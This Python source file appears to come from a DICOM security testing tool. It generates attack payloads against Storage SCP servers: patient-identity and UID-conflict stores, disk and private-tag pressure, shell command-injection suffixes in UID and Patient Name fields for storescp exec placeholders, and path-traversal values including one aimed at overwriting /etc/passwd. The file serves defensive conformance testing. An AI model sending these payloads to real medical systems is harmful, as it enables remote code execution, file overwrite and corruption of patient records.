def _payload_lookup(payloads, payload_id: str, kind: str) -> Tuple[str, str]:
    """Return ``(value, description)`` for ``payload_id`` from an ``(id, value,
    note)`` table, raising a ``kind``-labelled error when it is unknown."""
    for pid, value, note in payloads:
        if pid == payload_id:
            return value, note
    raise ValueError(f'unknown {kind} id: {payload_id!r}')


# =============================================================================
# Storage SCP Abuse - unauthenticated C-STORE import/storage side effects
# =============================================================================

class StorageSCPAbuseAttacks:
    """
    Attacks targeting the broader unauthenticated Storage SCP surface.

    These are not path traversal payloads. They probe what happens when any
    same-network peer can push objects into storage/import/database workflows:
    identity validation, command-vs-dataset consistency, SOP class confusion,
    disk pressure, and private-tag pressure.

    Pure payload generators - no network I/O. Deliver with C-STORE; metadata
    carries the Storage SOP Class, SOP Instance UID, and the coverage axis.
    """

    @staticmethod
    def empty_required_identity_store() -> AttackResult:
        """Store object with empty Patient Name and Patient ID."""
        ds = _injection_base_dataset()
        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', '')
        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', '')
        return AttackResult(
            name='storage_empty_required_identity',
            category='storage_abuse',
            payload=ds.encode(),
            description='C-STORE object with both Patient Name and Patient ID empty',
            expected_behavior='Storage SCP should reject, quarantine, or import '
                              'without creating ambiguous patient records',
            metadata={
                'coverage_scope': 'identity-validation',
                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def duplicate_patient_identity_conflict() -> AttackResult:
        """Store object with duplicate conflicting patient identity tags."""
        ds = Dataset()
        ds._force_append(Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID))
        ds._force_append(Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.30'))
        ds._force_append(Element(0x0008, 0x0060, 'CS', 'OT'))
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Trusted^Patient'))
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Injected^Patient'))
        ds._force_append(Element(0x0010, 0x0020, 'LO', 'TRUSTED-ID'))
        ds._force_append(Element(0x0010, 0x0020, 'LO', 'INJECTED-ID'))
        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.30.1'))
        ds._force_append(Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.30.2'))
        return AttackResult(
            name='storage_duplicate_patient_identity_conflict',
            category='storage_abuse',
            payload=ds.encode(),
            description='C-STORE object with duplicate conflicting patient identity tags',
            expected_behavior='Storage/import path should reject or deterministically '
                              'resolve duplicate identities without patient merge poison',
            metadata={
                'coverage_scope': 'identity-merge-poisoning',
                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5.30',
            },
        )

    @staticmethod
    def command_dataset_sop_class_conflict() -> AttackResult:
        """Command Storage SOP class differs from dataset SOP Class UID."""
        ds = _injection_base_dataset()
        ds[0x00080016] = Element(0x0008, 0x0016, 'UI', MR_IMAGE_STORAGE_SOP_CLASS_UID)
        return AttackResult(
            name='storage_command_dataset_sop_class_conflict',
            category='storage_abuse',
            payload=ds.encode(),
            description='C-STORE command says Secondary Capture while dataset claims MR Image Storage',
            expected_behavior='Storage SCP should reject or quarantine SOP class mismatch',
            metadata={
                'coverage_scope': 'command-dataset-sop-class-mismatch',
                'command_sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'dataset_sop_class_uid': MR_IMAGE_STORAGE_SOP_CLASS_UID,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def command_dataset_instance_uid_conflict() -> AttackResult:
        """Command Affected SOP Instance UID differs from dataset SOP Instance UID."""
        ds = _injection_base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.31')
        return AttackResult(
            name='storage_command_dataset_instance_uid_conflict',
            category='storage_abuse',
            payload=ds.encode(),
            description='C-STORE command and dataset carry different SOP Instance UIDs',
            expected_behavior='Storage SCP should reject or handle UID mismatch deterministically',
            metadata={
                'coverage_scope': 'command-dataset-instance-uid-mismatch',
                'command_sop_instance_uid': '1.2.3.4.5',
                'dataset_sop_instance_uid': '1.2.3.4.5.31',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def bulkdata_disk_pressure(size: int = 256 * 1024) -> AttackResult:
        """Store object with a larger raw Pixel Data value for storage pressure."""
        ds = _injection_base_dataset()
        ds = ds / Element(0x0028, 0x0010, 'US', 512)
        ds = ds / Element(0x0028, 0x0011, 'US', 512)
        ds = ds / Element(0x0028, 0x0100, 'US', 8)
        ds = ds / Element(0x7FE0, 0x0010, 'OB', b'X' * size)
        return AttackResult(
            name='storage_bulkdata_disk_pressure',
            category='storage_abuse',
            payload=ds.encode(),
            description=f'C-STORE object with {size} bytes of raw Pixel Data',
            expected_behavior='Storage SCP should enforce quotas and remain available under repeated stores',
            metadata={
                'coverage_scope': 'storage-quota-disk-pressure',
                'size': size,
                'repeat_for_detection': 100,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def private_tag_pressure(count: int = 128) -> AttackResult:
        """Store object with many private tags for scanner/import pressure."""
        ds = _injection_base_dataset()
        ds = ds / Element(0x0011, 0x0010, 'LO', 'C-SCARE')
        for i in range(count):
            ds = ds / Element(0x0011, 0x1000 + i, 'LO', f'private-{i:03d}')
        return AttackResult(
            name='storage_private_tag_pressure',
            category='storage_abuse',
            # sort_tags because group 0011 sorts before the base object's
            # (0020,xxxx) elements: appended in insertion order the Data Set
            # descends, which PS3.5 §7.1 forbids and a strict importer may
            # reject before it ever feels the private-tag pressure.
            payload=ds.encode(sort_tags=True),
            description=f'C-STORE object with {count} private data elements',
            expected_behavior='Storage/import path should bound private-tag processing and metadata insertion',
            metadata={
                'coverage_scope': 'private-tag-metadata-pressure',
                'private_tag_count': count,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def cstore_no_dataset_flag_with_data() -> AttackResult:
        """C-STORE command says no dataset while data PDV is present."""
        ds = _injection_base_dataset()
        payload, steps = _cstore_sequence_bytes(
            dataset=ds.encode(), data_set_type=0x0101)
        return AttackResult(
            name='storage_cstore_no_dataset_flag_with_data',
            category='storage_abuse',
            payload=payload,
            description='C-STORE-RQ Data Set Type says no dataset but a data PDV follows',
            expected_behavior='Storage SCP should reject inconsistent C-STORE command/data state',
            metadata={
                'coverage_scope': 'cstore-command-data-set-type-mismatch',
                'steps': steps,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def cstore_dataset_flag_without_data() -> AttackResult:
        """C-STORE command says dataset present but no data PDV follows."""
        payload, steps = _cstore_sequence_bytes(dataset=None, data_set_type=0x0000)
        return AttackResult(
            name='storage_cstore_dataset_flag_without_data',
            category='storage_abuse',
            payload=payload,
            description='C-STORE-RQ Data Set Type says dataset present but no data PDV follows',
            expected_behavior='Storage SCP should not create partial files or database rows',
            metadata={
                'coverage_scope': 'cstore-missing-data-pdv',
                'steps': steps,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def cstore_invalid_priority_with_dataset() -> AttackResult:
        """C-STORE command uses an out-of-range Priority value."""
        ds = _injection_base_dataset()
        payload, steps = _cstore_sequence_bytes(dataset=ds.encode(), priority=0xFFFF)
        return AttackResult(
            name='storage_cstore_invalid_priority_with_dataset',
            category='storage_abuse',
            payload=payload,
            description='C-STORE-RQ uses invalid Priority value 0xFFFF with dataset',
            expected_behavior='Storage SCP should reject or ignore invalid priority safely',
            metadata={
                'coverage_scope': 'cstore-invalid-priority',
                'steps': steps,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def cstore_move_originator_spoof() -> AttackResult:
        """C-STORE command includes spoofed Move Originator fields."""
        ds = _injection_base_dataset()
        payload, steps = _cstore_sequence_bytes(
            dataset=ds.encode(), move_originator_ae_title='ATTACKER',
            move_originator_message_id=0xFFFF)
        return AttackResult(
            name='storage_cstore_move_originator_spoof',
            category='storage_abuse',
            payload=payload,
            description='Standalone C-STORE-RQ carries spoofed Move Originator fields',
            expected_behavior='Storage SCP should not trust Move Originator fields for authorization or routing',
            metadata={
                'coverage_scope': 'cstore-move-originator-spoofing',
                'steps': steps,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every Storage SCP abuse payload."""
        yield cls.empty_required_identity_store()
        yield cls.duplicate_patient_identity_conflict()
        yield cls.command_dataset_sop_class_conflict()
        yield cls.command_dataset_instance_uid_conflict()
        yield cls.bulkdata_disk_pressure()
        yield cls.private_tag_pressure()
        yield cls.cstore_no_dataset_flag_with_data()
        yield cls.cstore_dataset_flag_without_data()
        yield cls.cstore_invalid_priority_with_dataset()
        yield cls.cstore_move_originator_spoof()


# =============================================================================
# Command Injection Attacks - shell metacharacters in storescp exec placeholders
# =============================================================================

class CommandInjectionAttacks:
    """
    Shell command injection via storescp's execution-option placeholders
    (DCMTK issue #1194, CVE-2026-5663).

    ``storescp`` substitutes attacker-controlled DICOM values into a command
    run through ``/bin/sh -c`` whenever ``--exec-on-reception`` (``-xcr``) or
    ``--exec-on-eostudy`` (``-xcs``) is configured:

        #f  <- received file name -- derived from SOP Instance UID (0008,0018)
        #p  <- received path      -- derived from Study Instance UID (0020,000D)
                                     with --sort-on-study-uid (-su), or from
                                     Patient Name (0010,0010) with
                                     --sort-on-patientname (-sp)
        #r  <- reverse-DNS name of the calling SCU's host

    DCMTK added allowlist sanitisation for the AE-title placeholders #a/#c in
    Feb 2024 (issue #1109) but not for #f/#p/#r. An unauthenticated SCU that
    embeds shell metacharacters in these fields achieves RCE on the storescp
    host; a hardened storescp must strip or reject them.

    The #r vector depends on the SCU host's reverse-DNS record, not on the
    DICOM object, so it is documented here but not emitted as a payload.

    Pure payload generators - no network I/O. Deliver with
    ``deliver.send_cstore`` so the crafted UID also reaches the C-STORE
    command set; ``metadata`` carries the matching sop_class_uid /
    sop_instance_uid.
    """

    # Benign proof-of-concept canary: creates a marker file, destroys nothing.
    _CANARY = '/tmp/c-scare-rce'

    # (id, injected suffix, description) - shell metacharacters left
    # unsanitised on the #f / #p / #r placeholders.
    _SHELL_PAYLOADS = [
        ('semicolon',   '; touch ' + _CANARY + ' ;',  'command separator'),
        ('pipe',        '| touch ' + _CANARY,         'pipe to a second command'),
        ('subshell',    '$(touch ' + _CANARY + ')',   'command substitution'),
        ('backtick',    '`touch ' + _CANARY + '`',    'backtick substitution'),
        ('logical_and', '&& touch ' + _CANARY,        'conditional chaining'),
        ('newline',     '\ntouch ' + _CANARY + '\n',  'newline-injected command'),
        ('redirect',    '> ' + _CANARY,               'output redirection'),
    ]

    @classmethod
    def _lookup(cls, payload_id: str) -> Tuple[str, str]:
        """Return (suffix, description) for a shell payload id."""
        return _payload_lookup(cls._SHELL_PAYLOADS, payload_id, 'shell payload')

    @classmethod
    def sop_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in SOP Instance UID - storescp #f placeholder."""
        suffix, note = cls._lookup(payload_id)
        malicious = '1.2.3.4.5' + suffix
        ds = _injection_base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', malicious)
        return AttackResult(
            name=f'cmd_injection_sop_uid_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'SOP Instance UID carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #f placeholder',
            metadata={
                'cve': 'CVE-2026-5663',
                'dcmtk_issue': 1194,
                'placeholder': '#f',
                'requires_option': '--exec-on-reception / --exec-on-eostudy',
                'target_field': '(0008,0018) SOP Instance UID',
                'shell_payload': suffix,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': malicious,
            },
        )

    @classmethod
    def study_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in Study Instance UID - storescp #p placeholder.

        Reached when storescp also runs with --sort-on-study-uid (-su), which
        names the per-study subdirectory after the Study Instance UID.
        """
        suffix, note = cls._lookup(payload_id)
        malicious = '1.2.3.4.5.1' + suffix
        ds = _injection_base_dataset()
        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', malicious)
        return AttackResult(
            name=f'cmd_injection_study_uid_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'Study Instance UID carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #p placeholder',
            metadata={
                'cve': 'CVE-2026-5663',
                'dcmtk_issue': 1194,
                'placeholder': '#p',
                'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
                'target_field': '(0020,000D) Study Instance UID',
                'shell_payload': suffix,
                'study_instance_uid': malicious,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def patient_name_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in Patient Name - storescp #p placeholder.

        Reached when storescp also runs with --sort-on-patientname (-sp),
        which names the per-patient subdirectory after the Patient Name.
        """
        suffix, note = cls._lookup(payload_id)
        malicious = 'Doe^John' + suffix
        ds = _injection_base_dataset()
        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', malicious)
        return AttackResult(
            name=f'cmd_injection_patient_name_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'Patient Name carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #p placeholder',
            metadata={
                'cve': 'CVE-2026-5663',
                'dcmtk_issue': 1194,
                'placeholder': '#p',
                'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
                'target_field': '(0010,0010) Patient Name',
                'shell_payload': suffix,
                'patient_name': malicious,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every command-injection attack payload."""
        # #f - the SOP Instance UID is always attacker-controlled: full sweep.
        for pid, _suffix, _note in cls._SHELL_PAYLOADS:
            yield cls.sop_instance_uid_injection(pid)
        # #p via Study Instance UID (needs --sort-on-study-uid).
        for pid in ('semicolon', 'subshell', 'backtick'):
            yield cls.study_instance_uid_injection(pid)
        # #p via Patient Name (needs --sort-on-patientname).
        for pid in ('semicolon', 'subshell', 'newline'):
            yield cls.patient_name_injection(pid)


# =============================================================================
# Path Traversal Attacks - directory traversal in stored DICOM filenames
# =============================================================================

class PathTraversalAttacks:
    """
    Relative path traversal in the DICOM attributes that DCMTK tools use to
    build the names of the files they write to disk (CVE-2022-2119 /
    CVE-2022-2120, fixed in DCMTK 3.6.7).

    storescp / dcmrecv name each received object after DICOM attributes:

        received file   <- SOP Instance UID  (0008,0018)
        per-study dir   <- Study Instance UID (0020,000D)  with --sort-on-study-uid
        per-patient dir <- Patient Name      (0010,0010)  with --sort-on-patientname

    The SCU tools (movescu / getscu) write incoming C-MOVE / C-GET
    sub-operation results the same way. Before 3.6.7 these values were used
    unsanitised, so ``../`` (POSIX) or ``..\\`` (Windows) sequences let a
    peer write DICOM files outside the intended storage directory under a
    controlled name -- a write primitive that can escalate to RCE by landing
    a file in a startup / cron / web-root path.

    CVE-2022-2119 is the SCP side: deliver these with ``deliver.send_cstore``
    to a live storescp. CVE-2022-2120 is the SCU side: serve the same crafted
    dataset from ``c_scare.server.RawSCP`` to a connecting client. The
    payloads are identical -- only the delivery direction differs.

    Pure payload generators - no network I/O. ``metadata`` carries the
    matching sop_class_uid / sop_instance_uid for send_cstore.
    """

    # (id, traversal value, description) - directory-escape sequences left
    # unsanitised on the filename-deriving attributes.
    _TRAVERSAL_PAYLOADS = [
        ('posix',    '../../../../../../tmp/c-scare-traversal',
         'POSIX relative traversal'),
        ('posix_proof', '../../../../../../tmp/c-scare-traversal-proof',
         'POSIX relative traversal with an unambiguous proof canary'),
        ('etc_passwd', '../../../../../../etc/passwd',
         'POSIX relative traversal targeting /etc/passwd overwrite'),
        ('null_byte', '../../../../../../tmp/attacker-controlled.attacker\x00.DCM',
         'POSIX traversal with attacker-controlled extension before NUL truncation'),
        ('ui_pad_nul', '../../../../../../tmp/c-scare-ui-pad0',
         'odd-length UI traversal relying on DICOM NUL padding'),
        ('overlong_uid', '../../../../../../tmp/c-scare-' + ('A' * 80),
         'over-64-character UI traversal value'),
        ('vm_first', '../../../../../../tmp/c-scare-vm-first\\1.2.3.4.5',
         'VM separator with malicious first SOP Instance UID value'),
        ('vm_second', '1.2.3.4.5\\../../../../../../tmp/c-scare-vm-second',
         'VM separator with malicious second SOP Instance UID value'),
        ('windows',  '..\\..\\..\\..\\..\\..\\Windows\\Temp\\c-scare-traversal',
         'Windows relative traversal'),
        ('windows_absolute', 'C:\\Windows\\Temp\\c-scare-traversal',
         'Windows drive-absolute path escaping the storage root'),
        ('unc', '\\\\localhost\\share\\c-scare-traversal',
         'Windows UNC path escaping the storage root'),
        ('absolute', '/tmp/c-scare-traversal',
         'absolute path escaping the storage root'),
        ('mixed',    '..\\../..\\../..\\../c-scare-traversal',
         'mixed forward/back separators'),
        ('encoded',  '..%2f..%2f..%2f..%2fc-scare-traversal',
         'URL-encoded traversal sequence'),
    ]

    _MULTI_FIELD_PROOF_ROOT = '../../../../../../tmp/c-scare-traversal-proof'

    @classmethod
    def _lookup(cls, payload_id: str) -> Tuple[str, str]:
        """Return (traversal value, description) for a payload id."""
        return _payload_lookup(cls._TRAVERSAL_PAYLOADS, payload_id, 'traversal payload')

    @classmethod
    def sop_instance_uid_traversal(cls, payload_id: str = 'posix') -> AttackResult:
        """Path traversal in SOP Instance UID - drives the received file name."""
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', value)
        return AttackResult(
            name=f'path_traversal_sop_uid_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'SOP Instance UID carries a {note}',
            expected_behavior='storescp/SCU must sanitise path separators '
                              'before naming the received file',
            metadata={
                'cve': 'CVE-2022-2119',
                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                'coverage_scope': 'dataset-and-command-sop-instance-uid',
                'target_field': '(0008,0018) SOP Instance UID',
                'traversal_payload': value,
                'regression_case': 'null-byte-extension-bypass'
                                   if payload_id == 'null_byte' else None,
                'dicom_ui_boundary': payload_id if payload_id in (
                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
                'dicom_vm_boundary': payload_id if payload_id in (
                    'vm_first', 'vm_second') else None,
                'vm_separator': payload_id in ('vm_first', 'vm_second'),
                'null_byte_filename_truncation': payload_id in (
                    'null_byte', 'ui_pad_nul'),
                'overlong_uid': payload_id == 'overlong_uid',
                'attacker_controlled_extension': '.attacker'
                                                 if payload_id == 'null_byte'
                                                 else None,
                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
                                    if payload_id in ('null_byte', 'ui_pad_nul')
                                    else None,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': value,
            },
        )

    @classmethod
    def command_sop_instance_uid_traversal(cls,
                                           payload_id: str = 'null_byte') -> AttackResult:
        """Path traversal in C-STORE command Affected SOP Instance UID only.

        Some receivers derive the stored filename from the DIMSE command set
        instead of the dataset value. This keeps the dataset SOP Instance UID
        benign while sending the malicious value as (0000,1000).
        """
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        return AttackResult(
            name=f'path_traversal_command_sop_uid_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'C-STORE command Affected SOP Instance UID carries a {note}',
            expected_behavior='Receiver must sanitise the command SOP Instance UID '
                              'before naming the received file',
            metadata={
                'cve': 'CVE-2022-2119',
                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                'coverage_scope': 'command-sop-instance-uid-only',
                'target_field': '(0000,1000) Affected SOP Instance UID',
                'dataset_sop_instance_uid': '1.2.3.4.5',
                'traversal_payload': value,
                'regression_case': 'null-byte-extension-bypass'
                                   if payload_id == 'null_byte' else None,
                'dicom_ui_boundary': payload_id if payload_id in (
                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
                'dicom_vm_boundary': payload_id if payload_id in (
                    'vm_first', 'vm_second') else None,
                'vm_separator': payload_id in ('vm_first', 'vm_second'),
                'null_byte_filename_truncation': payload_id in (
                    'null_byte', 'ui_pad_nul'),
                'overlong_uid': payload_id == 'overlong_uid',
                'attacker_controlled_extension': '.attacker'
                                                 if payload_id == 'null_byte'
                                                 else None,
                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
                                    if payload_id in ('null_byte', 'ui_pad_nul')
                                    else None,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': value,
            },
        )

    @classmethod
    def dataset_only_sop_instance_uid_traversal(
            cls, payload_id: str = 'null_byte') -> AttackResult:
        """Path traversal in dataset SOP Instance UID only.

        This keeps the DIMSE command Affected SOP Instance UID benign so a
        receiver that compares command-vs-dataset UIDs must reject or sanitise
        the dataset value before any filesystem write.
        """
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', value)
        return AttackResult(
            name=f'path_traversal_dataset_only_sop_uid_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'Dataset SOP Instance UID carries a {note} while the '
                        'C-STORE command UID stays benign',
            expected_behavior='Receiver must reject mismatched unsafe UIDs or '
                              'sanitise before naming the received file',
            metadata={
                'cve': 'CVE-2022-2119',
                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                'coverage_scope': 'dataset-sop-instance-uid-only',
                'target_field': '(0008,0018) SOP Instance UID',
                'dataset_sop_instance_uid': value,
                'command_sop_instance_uid': '1.2.3.4.5',
                'traversal_payload': value,
                'regression_case': 'null-byte-extension-bypass'
                                   if payload_id == 'null_byte' else None,
                'dicom_ui_boundary': payload_id if payload_id in (
                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
                'dicom_vm_boundary': payload_id if payload_id in (
                    'vm_first', 'vm_second') else None,
                'vm_separator': payload_id in ('vm_first', 'vm_second'),
                'null_byte_filename_truncation': payload_id in (
                    'null_byte', 'ui_pad_nul'),
                'overlong_uid': payload_id == 'overlong_uid',
                'attacker_controlled_extension': '.attacker'
                                                 if payload_id == 'null_byte'
                                                 else None,
                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
                                    if payload_id in ('null_byte', 'ui_pad_nul')
                                    else None,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def file_meta_sop_instance_uid_traversal(
            cls, payload_id: str = 'null_byte') -> AttackResult:
        """Path traversal in illegal-on-network File Meta SOP Instance UID.

        Network C-STORE datasets should not contain group 0002 file meta, but
        this probes receivers that accidentally parse (0002,0003) and use it
        for storage naming anyway.
        """
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        ds._force_append(Element(0x0002, 0x0003, 'UI', value))
        return AttackResult(
            name=f'path_traversal_file_meta_sop_uid_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'File Meta Media Storage SOP Instance UID carries a {note}',
            expected_behavior='Receiver must ignore illegal network file meta or '
                              'sanitise before naming the received file',
            metadata={
                'cve': 'CVE-2022-2119',
                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                'coverage_scope': 'file-meta-sop-instance-uid',
                # The group-0002 element inside the Data Set is the attack:
                # PS3.5 forbids it on the network, and the question is whether
                # a receiver parses it anyway and names a file from it.
                'bug_class': 'file-meta-element-in-dataset',
                'target_field': '(0002,0003) Media Storage SOP Instance UID',
                'dataset_sop_instance_uid': '1.2.3.4.5',
                'traversal_payload': value,
                'regression_case': 'null-byte-extension-bypass'
                                   if payload_id == 'null_byte' else None,
                'dicom_ui_boundary': payload_id if payload_id in (
                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
                'dicom_vm_boundary': payload_id if payload_id in (
                    'vm_first', 'vm_second') else None,
                'vm_separator': payload_id in ('vm_first', 'vm_second'),
                'null_byte_filename_truncation': payload_id in (
                    'null_byte', 'ui_pad_nul'),
                'overlong_uid': payload_id == 'overlong_uid',
                'attacker_controlled_extension': '.attacker'
                                                 if payload_id == 'null_byte'
                                                 else None,
                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
                                    if payload_id in ('null_byte', 'ui_pad_nul')
                                    else None,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def study_instance_uid_traversal(cls, payload_id: str = 'posix') -> AttackResult:
        """Path traversal in Study Instance UID - drives the per-study dir.

        Reached when storescp runs with --sort-on-study-uid (-su).
        """
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', value)
        return AttackResult(
            name=f'path_traversal_study_uid_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'Study Instance UID carries a {note}',
            expected_behavior='storescp must sanitise path separators before '
                              'naming the per-study subdirectory',
            metadata={
                'cve': 'CVE-2022-2119',
                'requires_option': '--sort-on-study-uid (-su)',
                'target_field': '(0020,000D) Study Instance UID',
                'traversal_payload': value,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def patient_name_traversal(cls, payload_id: str = 'posix') -> AttackResult:
        """Path traversal in Patient Name - drives the per-patient dir.

        Reached when storescp runs with --sort-on-patientname (-sp).
        """
        value, note = cls._lookup(payload_id)
        ds = _injection_base_dataset()
        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', value)
        return AttackResult(
            name=f'path_traversal_patient_name_{payload_id}',
            category='path_traversal',
            payload=ds.encode(),
            description=f'Patient Name carries a {note}',
            expected_behavior='storescp must sanitise path separators before '
                              'naming the per-patient subdirectory',
            metadata={
                'cve': 'CVE-2022-2119',
                'requires_option': '--sort-on-patientname (-sp)',
                'target_field': '(0010,0010) Patient Name',
                'traversal_payload': value,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def multi_field_storage_path_probe(cls) -> AttackResult:
        """Put one proof canary across every common storage-naming field.

        This is a benign proof-of-impact payload: a vulnerable receiver may
        write a DICOM object or storage directory under the canary path, while a
        partially sanitising receiver often leaves the canary text inside its
        storage root. Either outcome is easy to distinguish from generic import
        noise and identify in DUT-side filesystem monitoring.
        """
        root = cls._MULTI_FIELD_PROOF_ROOT
        overrides = {
            'SOPInstanceUID': f'{root}/sop-instance',
            'StudyInstanceUID': f'{root}/study-instance',
            'SeriesInstanceUID': f'{root}/series-instance',
            'PatientName': f'{root}/patient-name',
            'PatientID': 'CSCARE-PATH-PROOF',
        }
        ds = _injection_base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', overrides['SOPInstanceUID'])
        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', overrides['StudyInstanceUID'])
        ds[0x0020000E] = Element(0x0020, 0x000E, 'UI', overrides['SeriesInstanceUID'])
        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', overrides['PatientName'])
        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', overrides['PatientID'])
        return AttackResult(
            name='path_traversal_multi_field_storage_probe',
            category='path_traversal',
            payload=ds.encode(),
            description='SOP, Study, Series, and Patient fields carry the same '
                        'path traversal proof canary',
            expected_behavior='Receiver must reject the object or prove every '
                              'storage path is canonicalised inside the intended '
                              'root before filesystem writes occur',
            metadata={
                'cve': 'CVE-2022-2119',
                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                'coverage_scope': 'multi-field-storage-path-proof',
                'target_fields': [
                    '(0008,0018) SOP Instance UID',
                    '(0020,000D) Study Instance UID',
                    '(0020,000E) Series Instance UID',
                    '(0010,0010) Patient Name',
                    '(0010,0020) Patient ID',
                ],
                'traversal_payload': root,
                'proof_canary_leaf': 'c-scare-traversal-proof',
                'expected_escape_prefixes': [
                    '/tmp/c-scare-traversal-proof',
                    '/var/tmp/c-scare-traversal-proof',
                ],
                'sanitized_storage_marker': 'c-scare-traversal-proof',
                'cstore_field_overrides': overrides,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': overrides['SOPInstanceUID'],
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every path-traversal attack payload."""
        # SOP Instance UID always names the received file: full sweep.
        for pid, _value, _note in cls._TRAVERSAL_PAYLOADS:
            yield cls.sop_instance_uid_traversal(pid)
        yield cls.multi_field_storage_path_probe()
